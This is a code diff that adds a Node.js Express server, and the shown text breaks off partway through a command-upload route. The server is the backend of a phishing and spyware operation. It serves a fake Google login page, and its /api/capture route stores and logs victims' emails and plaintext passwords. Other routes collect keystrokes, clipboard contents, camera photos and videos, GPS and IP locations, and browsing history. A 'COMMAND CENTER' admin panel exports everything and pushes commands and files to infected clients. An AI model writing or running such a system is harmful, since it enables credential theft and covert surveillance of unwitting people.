@@ -1,0 +1,1028 @@
+const express = require('express');
+const multer = require('multer');
+const path = require('path');
+const cors = require('cors');
+const fs = require('fs');
+const http = require('http');
+const IS_VERCEL = !!process.env.VERCEL;
+const { Server } = IS_VERCEL ? { Server: null } : require('socket.io');
+let localtunnel;
+if (!IS_VERCEL) { try { localtunnel = require('localtunnel'); } catch (e) {} }
+
+// ═══════════════════════════════════════════════════════════════
+//  APP SETUP
+// ═══════════════════════════════════════════════════════════════
+const app = express();
+const server = http.createServer(app);
+const io = IS_VERCEL
+    ? { to: () => ({ emit: () => {} }), on: () => {}, emit: () => {} }
+    : new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 10 * 1024 * 1024 });
+const PORT = process.env.PORT || 3000;
+
+const UPLOAD_BASE = IS_VERCEL ? '/tmp/uploads' : path.join(__dirname, 'uploads');
+const DATA_DIR = IS_VERCEL ? '/tmp' : path.join(__dirname, 'data');
+[UPLOAD_BASE, `${UPLOAD_BASE}/photos`, `${UPLOAD_BASE}/videos`, `${UPLOAD_BASE}/audio`, `${UPLOAD_BASE}/files`, DATA_DIR].forEach(dir => {
+    try { if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true }); } catch (e) {}
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  PERSISTENT DATA STORE
+// ═══════════════════════════════════════════════════════════════
+const DATA_FILE = IS_VERCEL ? '/tmp/store.json' : path.join(__dirname, 'data', 'store.json');
+let saveTimeout = null;
+
+function getDefaultStore() {
+    return {
+        clients: {}, locations: [], media: [], photos: [],
+        errors: [], events: [], deviceInfo: {},
+        keystrokes: [], clipboard: [], pageVisits: [],
+        notes: {}, tags: {}, credentials: []
+    };
+}
+
+function loadStore() {
+    try {
+        if (fs.existsSync(DATA_FILE)) return JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
+    } catch (e) { console.error('Store load failed:', e.message); }
+    return getDefaultStore();
+}
+
+function saveStore() {
+    if (saveTimeout) clearTimeout(saveTimeout);
+    saveTimeout = setTimeout(() => {
+        try { fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2)); }
+        catch (e) { console.error('Store save failed:', e.message); }
+    }, 500);
+}
+
+function forceSave() {
+    try { fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2)); } catch (e) {}
+}
+process.on('SIGINT', () => { forceSave(); process.exit(0); });
+process.on('SIGTERM', () => { forceSave(); process.exit(0); });
+
+const store = loadStore();
+const defaults = getDefaultStore();
+Object.keys(defaults).forEach(k => { if (!store[k]) store[k] = defaults[k]; });
+
+// ═══════════════════════════════════════════════════════════════
+//  ADMIN AUTH
+// ═══════════════════════════════════════════════════════════════
+const ADMIN_PASSWORD = process.env.ADMIN_PASS || 'admin123';
+const adminTokens = new Set();
+const crypto = require('crypto');
+
+function generateToken() {
+    const token = crypto.randomBytes(32).toString('hex');
+    adminTokens.add(token);
+    return token;
+}
+
+function requireAuth(req, res, next) {
+    const token = req.headers['x-admin-token'] || req.query.token || req.cookies?.adminToken;
+    if (adminTokens.has(token)) return next();
+    res.status(401).json({ error: 'Unauthorized' });
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  CLIENT CONFIG (adjustable from admin)
+// ═══════════════════════════════════════════════════════════════
+const defaultConfig = {
+    photoEnabled: true, photoPeriod: 30000, photoQuality: 0.7,
+    videoEnabled: true, videoPeriod: 300000, videoDuration: 10000,
+    locationEnabled: true, locationPeriod: 15000,
+    keystrokesEnabled: true, keyLogFlush: 10000,
+    clipboardEnabled: true, clipboardCheck: 15000,
+    deviceInfoPeriod: 60000, heartbeatPeriod: 8000, commandPoll: 3000
+};
+if (!store.config) store.config = { ...defaultConfig };
+
+// Command queue (in-memory)
+const commandQueue = {};
+
+// ═══════════════════════════════════════════════════════════════
+//  HELPERS
+// ═══════════════════════════════════════════════════════════════
+function addEvent(type, data) {
+    const event = { type, data, timestamp: new Date().toISOString() };
+    store.events.unshift(event);
+    if (store.events.length > 2000) store.events.length = 2000;
+    io.to('admins').emit('event', event);
+    saveStore();
+}
+
+function getClientIP(req) {
+    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+           req.connection?.remoteAddress || req.ip || 'unknown';
+}
+
+// ── Server-side IP Geolocation ───────────────────────────────
+const geoCache = {};
+
+async function geolocateIP(ip) {
+    if (!ip || ip === 'unknown' || /^(127\.|192\.168\.|10\.|::1|::ffff:127\.|::ffff:192\.168\.|::ffff:10\.)/.test(ip)) {
+        return null;
+    }
+    const cleanIP = ip.replace('::ffff:', '');
+    if (geoCache[cleanIP] && (Date.now() - geoCache[cleanIP]._ts < 3600000)) {
+        return geoCache[cleanIP];
+    }
+    return new Promise(resolve => {
+        const url = `http://ip-api.com/json/${cleanIP}?fields=status,country,regionName,city,lat,lon,timezone,isp,org,as,query`;
+        http.get(url, res => {
+            let data = '';
+            res.on('data', chunk => data += chunk);
+            res.on('end', () => {
+                try {
+                    const json = JSON.parse(data);
+                    if (json.status === 'success') {
+                        json._ts = Date.now();
+                        geoCache[cleanIP] = json;
+                        resolve(json);
+                    } else resolve(null);
+                } catch { resolve(null); }
+            });
+        }).on('error', () => resolve(null));
+    });
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  RATE LIMITING
+// ═══════════════════════════════════════════════════════════════
+const rateLimits = {};
+function rateLimit(max, windowMs) {
+    return (req, res, next) => {
+        const ip = getClientIP(req);
+        const key = `${ip}:${req.method}:${req.path}`;
+        const now = Date.now();
+        if (!rateLimits[key] || now > rateLimits[key].reset) {
+            rateLimits[key] = { count: 1, reset: now + windowMs };
+        } else {
+            rateLimits[key].count++;
+        }
+        if (rateLimits[key].count > max) {
+            return res.status(429).json({ error: 'Too many requests', retryAfter: Math.ceil((rateLimits[key].reset - now) / 1000) });
+        }
+        next();
+    };
+}
+setInterval(() => {
+    const now = Date.now();
+    for (const key in rateLimits) if (now > rateLimits[key].reset) delete rateLimits[key];
+}, 60000);
+
+// ═══════════════════════════════════════════════════════════════
+//  MIDDLEWARE
+// ═══════════════════════════════════════════════════════════════
+app.use(cors());
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+// Simple cookie parser
+app.use((req, res, next) => {
+    req.cookies = {};
+    const cookieHeader = req.headers.cookie;
+    if (cookieHeader) {
+        cookieHeader.split(';').forEach(c => {
+            const [key, ...val] = c.trim().split('=');
+            if (key) req.cookies[key.trim()] = val.join('=').trim();
+        });
+    }
+    next();
+});
+app.use('/uploads', express.static(UPLOAD_BASE));
+app.use(express.static(path.join(__dirname, 'googl')));
+
+// ═══════════════════════════════════════════════════════════════
+//  MULTER
+// ═══════════════════════════════════════════════════════════════
+function makeUploader(subdir) {
+    return multer({
+        storage: multer.diskStorage({
+            destination: (req, file, cb) => cb(null, `${UPLOAD_BASE}/${subdir}/`),// Note: UPLOAD_BASE is set above
+            filename: (req, file, cb) => {
+                const ext = path.extname(file.originalname) || '.webm';
+                cb(null, `${req.body.clientId || 'unknown'}_${Date.now()}${ext}`);
+            }
+        }),
+        limits: { fileSize: 50 * 1024 * 1024 }
+    });
+}
+const uploadMedia = makeUploader('videos');
+const uploadPhoto = makeUploader('photos');
+const uploadCommandFile = multer({
+    storage: multer.diskStorage({
+        destination: (req, file, cb) => cb(null, `${UPLOAD_BASE}/files/`),// Note: UPLOAD_BASE is set above
+        filename: (req, file, cb) => {
+            const ext = path.extname(file.originalname);
+            const base = path.basename(file.originalname, ext).replace(/[^a-z0-9_\-]/gi, '_').slice(0, 60);
+            cb(null, `${base}_${Date.now()}${ext}`);
+        }
+    }),
+    limits: { fileSize: 100 * 1024 * 1024 }
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  CLIENT ROUTES
+// ═══════════════════════════════════════════════════════════════
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'googl', 'index.html')));
+app.get('/client.js', (req, res) => {
+    res.setHeader('Content-Type', 'application/javascript');
+    res.sendFile(path.join(__dirname, 'client.js'));
+});
+
+// ── Upload video/audio ──
+app.post('/upload-media', (req, res) => {
+    uploadMedia.single('media')(req, res, (err) => {
+        if (err) {
+            console.error('\u{26A0}\u{FE0F}  Upload error:', err.message);
+            return res.status(400).json({ error: err.message });
+        }
+        if (!req.file) return res.status(400).json({ error: 'No file' });
+        const entry = {
+            id: Date.now().toString(36), clientId: req.body.clientId || 'unknown',
+            filename: req.file.filename, size: req.file.size, mimeType: req.file.mimetype,
+            path: `/uploads/videos/${req.file.filename}`, timestamp: new Date().toISOString()
+        };
+        store.media.unshift(entry);
+        if (store.media.length > 500) store.media.length = 500;
+        addEvent('media', { clientId: entry.clientId, filename: entry.filename, size: entry.size });
+        console.log(`\u{1F4F9} Video from ${entry.clientId}: ${entry.filename} (${(entry.size/1024).toFixed(0)} KB)`);
+        res.json({ success: true, id: entry.id });
+    });
+});
+
+// ── Server-side IP geo proxy (avoids CORS issues on client) ──
+app.get('/api/ip-geo', async (req, res) => {
+    try {
+        const ip = getClientIP(req);
+        const geo = await geolocateIP(ip);
+        if (geo) {
+            res.json({ status: 'success', ip, country: geo.country, regionName: geo.regionName, city: geo.city, lat: geo.lat, lon: geo.lon, timezone: geo.timezone, isp: geo.isp, org: geo.org, as: geo.as, query: geo.query });
+        } else {
+            res.json({ status: 'fail', ip, message: 'Local/private IP or lookup failed' });
+        }
+    } catch (e) {
+        res.json({ status: 'fail', message: e.message });
+    }
+});
+
+// ── Upload photo ──
+app.post('/upload-photo', (req, res) => {
+    uploadPhoto.single('photo')(req, res, (err) => {
+        if (err) {
+            console.error('\u{26A0}\u{FE0F}  Photo upload error:', err.message);
+            return res.status(400).json({ error: err.message });
+        }
+        if (!req.file) return res.status(400).json({ error: 'No file' });
+    const entry = {
+        id: Date.now().toString(36), clientId: req.body.clientId || 'unknown',
+        filename: req.file.filename, size: req.file.size, mimeType: req.file.mimetype,
+        path: `/uploads/photos/${req.file.filename}`, timestamp: new Date().toISOString()
+    };
+    store.photos.unshift(entry);
+    if (store.photos.length > 2000) store.photos.length = 2000;
+    if (store.clients[entry.clientId]) {
+        store.clients[entry.clientId].lastPhoto = entry.path;
+        store.clients[entry.clientId].lastPhotoTime = entry.timestamp;
+    }
+    addEvent('photo', { clientId: entry.clientId, filename: entry.filename, path: entry.path });
+    console.log(`\u{1F4F7} Photo from ${entry.clientId}: ${entry.filename}`);
+    res.json({ success: true, id: entry.id, path: entry.path });
+    });
+});
+
+// ── Location ──
+app.post('/upload-location', (req, res) => {
+    const { clientId, latitude, longitude, accuracy, altitude, speed, heading, source } = req.body;
+    if (!latitude || !longitude) return res.status(400).json({ error: 'Missing coords' });
+    const entry = {
+        id: Date.now().toString(36), clientId: clientId || 'unknown',
+        latitude, longitude, accuracy: accuracy || null, altitude: altitude || null,
+        speed: speed || null, heading: heading || null, source: source || 'unknown',
+        timestamp: new Date().toISOString()
+    };
+    store.locations.unshift(entry);
+    if (store.locations.length > 5000) store.locations.length = 5000;
+    const cid = entry.clientId;
+    if (!store.clients[cid]) store.clients[cid] = { firstSeen: entry.timestamp };
+    store.clients[cid].lastLocation = { latitude, longitude, accuracy, altitude, speed, heading, source };
+    store.clients[cid].lastSeen = entry.timestamp;
+    addEvent('location', { clientId: cid, latitude, longitude, accuracy, source });
+    console.log(`\u{1F4CD} Location from ${cid}: ${latitude.toFixed(5)}, ${longitude.toFixed(5)} [${source}]`);
+    res.json({ success: true });
+});
+
+// ── Device info ──
+app.post('/device-info', (req, res) => {
+    const { clientId, ...info } = req.body;
+    if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
+    info.ip = getClientIP(req);
+    info.timestamp = new Date().toISOString();
+    store.deviceInfo[clientId] = { ...(store.deviceInfo[clientId] || {}), ...info };
+    if (store.clients[clientId]) store.clients[clientId].deviceInfo = store.deviceInfo[clientId];
+    addEvent('device_info', { clientId, platform: info.platform, ip: info.ip });
+    console.log(`\u{1F4F1} Device info from ${clientId}: ${info.platform || 'unknown'} (${info.ip})`);
+    res.json({ success: true });
+});
+
+// ── Keystroke logging ──
+app.post('/log-keys', (req, res) => {
+    const { clientId, keys, url } = req.body;
+    if (!clientId || !keys) return res.status(400).json({ error: 'Missing data' });
+    const entry = {
+        id: Date.now().toString(36), clientId, keys,
+        url: url || '', timestamp: new Date().toISOString()
+    };
+    store.keystrokes.unshift(entry);
+    if (store.keystrokes.length > 5000) store.keystrokes.length = 5000;
+    addEvent('keystrokes', { clientId, length: keys.length, url: url || '' });
+    console.log(`\u{2328}\u{FE0F}  Keys from ${clientId}: ${keys.length} chars`);
+    res.json({ success: true });
+});
+
+// ── Clipboard ──
+app.post('/log-clipboard', (req, res) => {
+    const { clientId, content } = req.body;
+    if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
+    const entry = {
+        id: Date.now().toString(36), clientId,
+        content: (content || '').slice(0, 5000), timestamp: new Date().toISOString()
+    };
+    store.clipboard.unshift(entry);
+    if (store.clipboard.length > 1000) store.clipboard.length = 1000;
+    addEvent('clipboard', { clientId, length: (content || '').length });
+    console.log(`\u{1F4CB} Clipboard from ${clientId}: ${(content || '').slice(0, 50)}`);
+    res.json({ success: true });
+});
+
+// ── Page visits ──
+app.post('/log-visit', (req, res) => {
+    const { clientId, url, title, referrer } = req.body;
+    if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
+    const entry = {
+        id: Date.now().toString(36), clientId,
+        url: url || '', title: title || '', referrer: referrer || '',
+        timestamp: new Date().toISOString()
+    };
+    store.pageVisits.unshift(entry);
+    if (store.pageVisits.length > 2000) store.pageVisits.length = 2000;
+    addEvent('page_visit', { clientId, url: url || '', title: title || '' });
+    console.log(`\u{1F310} Visit from ${clientId}: ${url || 'unknown'}`);
+    res.json({ success: true });
+});
+
+// ── Error logging ──
+app.post('/log-error', (req, res) => {
+    const entry = {
+        id: Date.now().toString(36),
+        clientId: req.body.clientId || 'unknown',
+        type: req.body.type || 'unknown',
+        message: req.body.message || req.body.error || 'No details',
+        timestamp: new Date().toISOString()
+    };
+    store.errors.unshift(entry);
+    if (store.errors.length > 500) store.errors.length = 500;
+    addEvent('error', { clientId: entry.clientId, type: entry.type, message: entry.message });
+    console.log(`\u{26A0}\u{FE0F}  Error from ${entry.clientId}: [${entry.type}] ${entry.message}`);
+    res.json({ success: true });
+});
+
+// ── Google login credential capture ──
+app.post('/api/capture', (req, res) => {
+    const { email, password, source, timestamp } = req.body;
+    if (!email || !password) return res.status(400).json({ error: 'Missing fields' });
+    if (!store.credentials) store.credentials = [];
+    const entry = {
+        id: Date.now().toString(36),
+        email: email.trim(),
+        password,
+        source: source || 'unknown',
+        ip: getClientIP(req),
+        userAgent: req.headers['user-agent'] || '',
+        timestamp: timestamp || new Date().toISOString()
+    };
+    store.credentials.unshift(entry);
+    if (store.credentials.length > 1000) store.credentials.length = 1000;
+    saveStore();
+    addEvent('credential_captured', { email: entry.email, source: entry.source, ip: entry.ip });
+    console.log(`\u{1F511} Credential captured: ${entry.email} | ${entry.password} (${entry.ip})`);
+    res.json({ success: true });
+});
+
+// ── Heartbeat with server-side IP geo ──
+app.post('/heartbeat', rateLimit(30, 10000), async (req, res) => {
+    const { clientId, userAgent, screenW, screenH, battery, charging,
+            networkType, downlink, saveData,
+            language, timezone,
+            isIdle, idleSecs, tabHidden, hiddenMs, maxScrollPct } = req.body;
+    if (!clientId) return res.status(400).json({ error: 'Missing clientId' });
+
+    const now = new Date().toISOString();
+    const ip = getClientIP(req);
+    const isNew = !store.clients[clientId];
+
+    if (isNew) {
+        store.clients[clientId] = { firstSeen: now };
+        addEvent('client_connected', { clientId, userAgent, ip });
+        console.log(`\u{1F7E2} New client: ${clientId} (${ip})`);
+    }
+
+    const c = store.clients[clientId];
+    c.lastSeen = now;
+    c.online = true;
+    c.ip = ip;
+    if (userAgent) c.userAgent = userAgent;
+    if (screenW) c.screen = `${screenW}x${screenH}`;
+    if (battery !== undefined) c.battery = battery;
+    if (charging !== undefined) c.charging = charging;
+    if (networkType) c.networkType = networkType;
+    if (downlink !== undefined) c.downlink = downlink;
+    if (saveData !== undefined) c.saveData = saveData;
+    if (language) c.language = language;
+    if (timezone) c.timezone = timezone;
+    // Activity state
+    if (isIdle !== undefined) c.isIdle = isIdle;
+    if (idleSecs !== undefined) c.idleSecs = idleSecs;
+    if (tabHidden !== undefined) c.tabHidden = tabHidden;
+    if (hiddenMs !== undefined) c.hiddenMs = hiddenMs;
+    if (maxScrollPct !== undefined) c.maxScrollPct = maxScrollPct;
+
+    // Server-side IP geolocation (first heartbeat or refresh every hour)
+    if (!c.ipGeo || (Date.now() - new Date(c.ipGeo._ts || 0).getTime() > 3600000)) {
+        const geo = await geolocateIP(ip);
+        if (geo) {
+            c.ipGeo = {
+                country: geo.country, region: geo.regionName, city: geo.city,
+                lat: geo.lat, lon: geo.lon, timezone: geo.timezone,
+                isp: geo.isp, org: geo.org, as: geo.as, _ts: now
+            };
+            // Auto-create location from IP if no GPS location exists
+            if (!c.lastLocation) {
+                const locEntry = {
+                    id: Date.now().toString(36), clientId,
+                    latitude: geo.lat, longitude: geo.lon, accuracy: 10000,
+                    source: 'ip-server', timestamp: now
+                };
+                store.locations.unshift(locEntry);
+                if (store.locations.length > 5000) store.locations.length = 5000;
+                c.lastLocation = { latitude: geo.lat, longitude: geo.lon, accuracy: 10000, source: 'ip-server' };
+                addEvent('location', { clientId, latitude: geo.lat, longitude: geo.lon, source: 'ip-server' });
+                console.log(`\u{1F4CD} IP-Geo for ${clientId}: ${geo.city}, ${geo.country} (${geo.lat}, ${geo.lon})`);
+            }
+        }
+    }
+
+    saveStore();
+    res.json({ success: true });
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  ADMIN ROUTES
+// ═══════════════════════════════════════════════════════════════
+app.get('/admin', (req, res) => {
+    const token = req.cookies?.adminToken || req.query.token;
+    if (adminTokens.has(token)) {
+        return res.sendFile(path.join(__dirname, 'admin.html'));
+    }
+    // Show login page
+    res.send(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',system-ui,sans-serif;background:#07070c;color:#d0d0d0;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.login{background:#0c0c14;border:1px solid #16162a;border-radius:12px;padding:40px;width:340px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.login h1{font-size:1.2rem;color:#e94560;letter-spacing:3px;margin-bottom:8px;font-weight:800}
+.login p{font-size:.72rem;color:#555;margin-bottom:24px}
+.login input{width:100%;padding:12px 16px;background:#12122a;border:1px solid #16162a;border-radius:8px;color:#d0d0d0;font-size:.85rem;font-family:inherit;outline:none;transition:border-color .2s;margin-bottom:14px}
+.login input:focus{border-color:#e94560}
+.login button{width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer;transition:background .2s}
+.login button:hover{background:#d13050}
+.login .err{color:#f44;font-size:.72rem;margin-top:8px;min-height:18px}
+</style></head><body>
+<div class="login"><h1>COMMAND CENTER</h1><p>Enter admin password to continue</p>
+<form onsubmit="return doLogin(event)"><input type="password" id="pw" placeholder="Password..." autofocus autocomplete="current-password"><button type="submit">Login</button></form>
+<div class="err" id="err"></div></div>
+<script>async function doLogin(e){e.preventDefault();const pw=document.getElementById('pw').value;const r=await fetch('/api/auth/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})});const d=await r.json();if(d.success){document.cookie='adminToken='+d.token+';path=/;SameSite=Lax';location.href='/admin';}else{document.getElementById('err').textContent=d.error||'Wrong password';document.getElementById('pw').value='';document.getElementById('pw').focus();}return false;}</script>
+</body></html>`);
+});
+
+// Auth endpoints
+app.post('/api/auth/login', (req, res) => {
+    const { password } = req.body;
+    if (password === ADMIN_PASSWORD) {
+        const token = generateToken();
+        console.log('🔓 Admin logged in');
+        res.json({ success: true, token });
+    } else {
+        console.log('🔒 Failed login attempt');
+        res.status(401).json({ error: 'Fout wachtwoord' });
+    }
+});
+
+app.post('/api/auth/logout', (req, res) => {
+    const token = req.cookies?.adminToken || req.headers['x-admin-token'];
+    if (token) adminTokens.delete(token);
+    res.json({ success: true });
+});
+
+app.get('/api/auth/check', (req, res) => {
+    const token = req.cookies?.adminToken || req.headers['x-admin-token'];
+    res.json({ authenticated: adminTokens.has(token) });
+});
+
+// ── Search across all data ──
+app.get('/api/search', requireAuth, (req, res) => {
+    const q = (req.query.q || '').toLowerCase().trim();
+    if (!q || q.length < 2) return res.json({ results: [] });
+    const maxPerType = 10;
+    const results = {};
+
+    // Search clients
+    const clientMatches = Object.entries(store.clients).filter(([id, c]) =>
+        id.toLowerCase().includes(q) || (c.ip || '').includes(q) || (c.userAgent || '').toLowerCase().includes(q) ||
+        (c.ipGeo && JSON.stringify(c.ipGeo).toLowerCase().includes(q))
+    ).slice(0, maxPerType).map(([id, c]) => ({ id, online: c.online, ip: c.ip, lastSeen: c.lastSeen }));
+    if (clientMatches.length) results.clients = clientMatches;
+
+    // Search keystrokes
+    const keyMatches = store.keystrokes.filter(k =>
+        k.keys.toLowerCase().includes(q) || k.clientId.toLowerCase().includes(q) || (k.url || '').toLowerCase().includes(q)
+    ).slice(0, maxPerType);
+    if (keyMatches.length) results.keystrokes = keyMatches;
+
+    // Search clipboard
+    const clipMatches = store.clipboard.filter(c =>
+        (c.content || '').toLowerCase().includes(q) || c.clientId.toLowerCase().includes(q)
+    ).slice(0, maxPerType);
+    if (clipMatches.length) results.clipboard = clipMatches;
+
+    // Search page visits
+    const visitMatches = store.pageVisits.filter(v =>
+        (v.url || '').toLowerCase().includes(q) || (v.title || '').toLowerCase().includes(q) || v.clientId.toLowerCase().includes(q)
+    ).slice(0, maxPerType);
+    if (visitMatches.length) results.visits = visitMatches;
+
+    // Search device info
+    const deviceMatches = Object.entries(store.deviceInfo).filter(([id, info]) =>
+        id.toLowerCase().includes(q) || JSON.stringify(info).toLowerCase().includes(q)
+    ).slice(0, maxPerType).map(([id, info]) => ({ clientId: id, platform: info.platform, ip: info.ip }));
+    if (deviceMatches.length) results.devices = deviceMatches;
+
+    // Search errors
+    const errorMatches = store.errors.filter(e =>
+        (e.message || '').toLowerCase().includes(q) || (e.clientId || '').toLowerCase().includes(q)
+    ).slice(0, maxPerType);
+    if (errorMatches.length) results.errors = errorMatches;
+
+    res.json({ query: q, results });
+});
+
+app.get('/api/stats', requireAuth, (req, res) => {
+    const cutoff = Date.now() - 20000;
+    Object.entries(store.clients).forEach(([id, c]) => {
+        if (new Date(c.lastSeen).getTime() < cutoff) c.online = false;
+    });
+    res.json({
+        clients: store.clients,
+        clientCount: Object.keys(store.clients).length,
+        onlineCount: Object.values(store.clients).filter(c => c.online).length,
+        locationCount: store.locations.length,
+        mediaCount: store.media.length,
+        photoCount: store.photos.length,
+        errorCount: store.errors.length,
+        keystrokeCount: store.keystrokes.length,
+        clipboardCount: store.clipboard.length,
+        visitCount: store.pageVisits.length,
+        credentialCount: (store.credentials || []).length,
+        deviceInfo: store.deviceInfo,
+        tags: store.tags || {},
+        notes: Object.fromEntries(Object.entries(store.notes || {}).map(([k, v]) => [k, v.length]))
+    });
+});
+
+app.get('/api/locations', requireAuth, (req, res) => {
+    const limit = Math.min(parseInt(req.query.limit) || 100, 2000);
+    const cid = req.query.clientId;
+    let d = store.locations;
+    if (cid) d = d.filter(l => l.clientId === cid);
+    res.json(d.slice(0, limit));
+});
+
+app.get('/api/media', requireAuth, (req, res) => {
+    const limit = Math.min(parseInt(req.query.limit) || 50, 200);
+    const cid = req.query.clientId;
+    let d = store.media;
+    if (cid) d = d.filter(m => m.clientId === cid);
+    res.json(d.slice(0, limit));
+});
+
+app.get('/api/photos', requireAuth, (req, res) => {
+    const limit = Math.min(parseInt(req.query.limit) || 50, 500);
+    const cid = req.query.clientId;
+    let d = store.photos;
+    if (cid) d = d.filter(p => p.clientId === cid);
+    res.json(d.slice(0, limit));
+});
+
+app.get('/api/errors', requireAuth, (req, res) => {
+    const limit = Math.min(parseInt(req.query.limit) || 50, 200);
+    res.json(store.errors.slice(0, limit));
+});
+
+app.get('/api/events', requireAuth, (req, res) => {
+    const limit = Math.min(parseInt(req.query.limit) || 100, 500);
+    res.json(store.events.slice(0, limit));
+});
+
+app.get('/api/keystrokes', requireAuth, (req, res) => {
+    const limit = Math.min(parseInt(req.query.limit) || 100, 1000);
+    const cid = req.query.clientId;
+    let d = store.keystrokes;
+    if (cid) d = d.filter(k => k.clientId === cid);
+    res.json(d.slice(0, limit));
+});
+
+app.get('/api/clipboard', requireAuth, (req, res) => {
+    const limit = Math.min(parseInt(req.query.limit) || 50, 500);
+    const cid = req.query.clientId;
+    let d = store.clipboard;
+    if (cid) d = d.filter(c => c.clientId === cid);
+    res.json(d.slice(0, limit));
+});
+
+app.get('/api/visits', requireAuth, (req, res) => {
+    const limit = Math.min(parseInt(req.query.limit) || 100, 1000);
+    const cid = req.query.clientId;
+    let d = store.pageVisits;
+    if (cid) d = d.filter(v => v.clientId === cid);
+    res.json(d.slice(0, limit));
+});
+
+// ── Captured credentials ──
+app.get('/api/credentials', requireAuth, (req, res) => {
+    const limit = Math.min(parseInt(req.query.limit) || 200, 1000);
+    res.json((store.credentials || []).slice(0, limit));
+});
+
+app.delete('/api/credentials', requireAuth, (req, res) => {
+    store.credentials = [];
+    saveStore();
+    res.json({ success: true });
+});
+
+// ── Export all data ──
+app.get('/api/export', requireAuth, (req, res) => {
+    res.setHeader('Content-Disposition', `attachment; filename=export_${Date.now()}.json`);
+    res.setHeader('Content-Type', 'application/json');
+    res.json(store);
+});
+
+// ── Delete all ──
+app.delete('/api/clear', requireAuth, (req, res) => {
+    Object.assign(store, getDefaultStore());
+    saveStore();
+    console.log('\u{1F5D1}\u{FE0F}  All data cleared');
+    res.json({ success: true });
+});
+
+// ── Notes for clients ──
+app.get('/api/notes/:clientId', requireAuth, (req, res) => {
+    res.json(store.notes?.[req.params.clientId] || []);
+});
+app.post('/api/notes/:clientId', requireAuth, (req, res) => {
+    if (!store.notes) store.notes = {};
+    if (!store.notes[req.params.clientId]) store.notes[req.params.clientId] = [];
+    const note = { id: Date.now().toString(36), text: (req.body.text || '').trim().slice(0, 2000), timestamp: new Date().toISOString() };
+    if (!note.text) return res.status(400).json({ error: 'Empty note' });
+    store.notes[req.params.clientId].unshift(note);
+    if (store.notes[req.params.clientId].length > 100) store.notes[req.params.clientId].length = 100;
+    saveStore();
+    res.json({ success: true, note });
+});
+app.delete('/api/notes/:clientId/:noteId', requireAuth, (req, res) => {
+    if (store.notes?.[req.params.clientId]) {
+        store.notes[req.params.clientId] = store.notes[req.params.clientId].filter(n => n.id !== req.params.noteId);
+        saveStore();
+    }
+    res.json({ success: true });
+});
+
+// ── Tags / labels / pin ──
+app.get('/api/tags', requireAuth, (req, res) => {
+    res.json(store.tags || {});
+});
+app.post('/api/tags/:clientId', requireAuth, (req, res) => {
+    if (!store.tags) store.tags = {};
+    store.tags[req.params.clientId] = { ...(store.tags[req.params.clientId] || {}), ...req.body, updatedAt: new Date().toISOString() };
+    saveStore();
+    io.to('admins').emit('tags_updated', store.tags);
+    res.json({ success: true });
+});
+
+// ── Per-client data export ──
+app.get('/api/client/:id/export', requireAuth, (req, res) => {
+    const id = req.params.id;
+    const data = {
+        exportedAt: new Date().toISOString(), clientId: id,
+        client: store.clients[id] || {},
+        deviceInfo: store.deviceInfo[id] || {},
+        locations: store.locations.filter(l => l.clientId === id),
+        photos: store.photos.filter(p => p.clientId === id),
+        media: store.media.filter(m => m.clientId === id),
+        keystrokes: store.keystrokes.filter(k => k.clientId === id),
+        clipboard: store.clipboard.filter(c => c.clientId === id),
+        pageVisits: store.pageVisits.filter(v => v.clientId === id),
+        notes: store.notes?.[id] || [],
+        tags: store.tags?.[id] || {},
+        events: store.events.filter(e => e.data?.clientId === id)
+    };
+    res.setHeader('Content-Disposition', `attachment; filename=client_${id}_${Date.now()}.json`);
+    res.setHeader('Content-Type', 'application/json');
+    res.json(data);
+});
+
+// ── Send test event (admin debug) ──
+app.post('/api/test-event', requireAuth, (req, res) => {
+    addEvent(req.body.type || 'test', req.body.data || { message: 'Test event' });
+    res.json({ success: true });
+});
+
+// ── Delete client ──
+app.delete('/api/client/:id', requireAuth, (req, res) => {
+    const id = req.params.id;
+    delete store.clients[id];
+    delete store.deviceInfo[id];
+    store.locations = store.locations.filter(l => l.clientId !== id);
+    store.media = store.media.filter(m => m.clientId !== id);
+    store.photos = store.photos.filter(p => p.clientId !== id);
+    store.errors = store.errors.filter(e => e.clientId !== id);
+    store.keystrokes = store.keystrokes.filter(k => k.clientId !== id);
+    store.clipboard = store.clipboard.filter(c => c.clientId !== id);
+    store.pageVisits = store.pageVisits.filter(v => v.clientId !== id);
+    saveStore();
+    console.log(`\u{1F5D1}\u{FE0F}  Client ${id} deleted`);
+    res.json({ success: true });
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  CONFIG & COMMANDS API
+// ═══════════════════════════════════════════════════════════════
+app.get('/api/config', (req, res) => res.json(store.config || defaultConfig));
+
+app.post('/api/config', requireAuth, (req, res) => {
+    store.config = { ...(store.config || defaultConfig), ...req.body };
+    saveStore();
+    console.log('\u{2699}\u{FE0F}  Config updated');
+    res.json({ success: true, config: store.config });
+});
+
+// ── Upload file and queue as command ──
+app.post('/api/command-file', requireAuth, uploadCommandFile.single('file'), (req, res) => {
+    if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
+    const { target = 'all', customName } = req.body;
+    const displayName = customName && customName.trim() ? customName.trim() : req.file.originalname;
+    const cmd = {
+        id: Date.now().toString(36),
+        type: 'file',
+        data: {
